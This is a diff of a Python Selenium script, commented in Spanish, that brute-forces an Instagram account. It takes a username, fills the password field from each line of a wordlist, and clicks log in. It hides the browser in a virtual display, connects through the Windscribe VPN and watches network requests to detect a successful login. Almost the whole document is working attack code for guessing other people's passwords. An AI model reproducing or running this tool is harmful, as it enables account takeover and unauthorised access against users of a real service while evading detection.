@@ -38,6 +38,8 @@ user = input(Fore.GREEN+"\tInstagram username or mail: "+Style.RESET_ALL)
 subprocess.run(['sudo', 'windscribe', 'start'])
 subprocess.run(['sudo', 'windscribe', 'connect'])
 
+#Registramos las solicitudes HTTP a la web para comprobar si el inicio de sesion ha sido exitoso
+
 def monitor_status(driver):
     while True:
         requests = driver.execute_script(
@@ -57,27 +59,28 @@ def monitor_status(driver):
                 if "https://www.instagram.com/ajax/bootloader-endpoint" in request['url']:
                     print("Password found!")
                     subprocess.run(['sudo', 'windscribe', 'disconnect'])
-                    return  # Termina la ejecución del programa
+                    return  # Termina el programa
         else:
             print("No se han realizado solicitudes aún.")
 
         time.sleep(1)  # Espera 1 segundo antes de verificar nuevamente
 
+#Lo siguiente es codigo que automatiza el envio de contraseñas a la web
+
 def login_and_actions(driver, file_path):
-    # Encontrar y hacer clic en el botón "Allow all cookies"
+
+    #Acepta las cookies de la web automaticamente
     allow_cookies_button = WebDriverWait(driver, 10).until(
         EC.presence_of_element_located((By.XPATH, '//button[contains(text(), "Allow all cookies")]'))
     )
     allow_cookies_button.click()
 
-    # Esperar un momento para que la página se cargue
+    # Espera un momento para que la página se cargue
     time.sleep(3)
 
-    # Encontrar la caja de texto para el nombre de usuario y escribir "pngyasociados"
+    # Encuentra el elemento HTML de la caja de texto del nombre de usuario y la contraseña y envía los datos correspondientes
     username_input = driver.find_element(By.CSS_SELECTOR, 'input[name="username"]')
     username_input.send_keys(user)
-
-    # Encontrar la caja de texto para la contraseña
     password_input = driver.find_element(By.CSS_SELECTOR, 'input[name="password"]')
 
     with open(file_path, "r") as file:
@@ -85,24 +88,24 @@ def login_and_actions(driver, file_path):
 
         for line in lines:
             try:
-                # Limpiar el contenido de la caja de texto password_input
-                password_input.send_keys(Keys.CONTROL + "a")  # Seleccionar todo el texto
-                password_input.send_keys(Keys.DELETE)  # Borrar el texto seleccionado
+                # Limpia el contenido de la caja de texto password_input en cada iteración
+                password_input.send_keys(Keys.CONTROL + "a")  # Selecciona todo el texto
+                password_input.send_keys(Keys.DELETE)  # Borra el texto seleccionado
 
-                # Introducir la nueva línea del archivo en la caja de texto password_input
+                # Introduce la nueva línea del archivo en la caja de texto password_input
                 password_input.send_keys(line.strip())
                 print(f"Trying password: {line.strip()}")
             except Exception as e:
                 print(f"Password found!")
                 return
 
-            # Encontrar y hacer clic en el botón "Log in"
+            # Encuentra y hace clic en el botón "Log in"
             login_button = driver.find_element(By.CSS_SELECTOR, 'button[type="submit"]')
             login_button.click()
 
-            time.sleep(5)  # Esperar 5 segundos
+            time.sleep(5)  # Espera 5 segundos para observar la respuesta HTTP de la web
 
-            # Encontrar la respuesta HTTP
+            # Observamos la respuesta HTTP de la web
             requests = driver.execute_script(
                 """
                 let requests = [];
@@ -120,7 +123,7 @@ def login_and_actions(driver, file_path):
                 if "https://www.instagram.com/ajax/bootloader-endpoint" in request['url']:
                     print("Password found!")
                     subprocess.run(['sudo', 'windscribe', 'disconnect'])
-                    return  # Termina la ejecución del programa
+                    return  # Termina el programa
                 else:
                     found = False
 
@@ -129,7 +132,7 @@ def login_and_actions(driver, file_path):
 
 if __name__ == "__main__":
 
-    display = Display(visible=0, size=(1920, 1080))  # Tamaño de la pantalla virtual (opcional)
+    display = Display(visible=0, size=(1920, 1080))  # Dejamos a la herramienta trabajar en segundo plano
     display.start()
 
     chrome_options = Options()
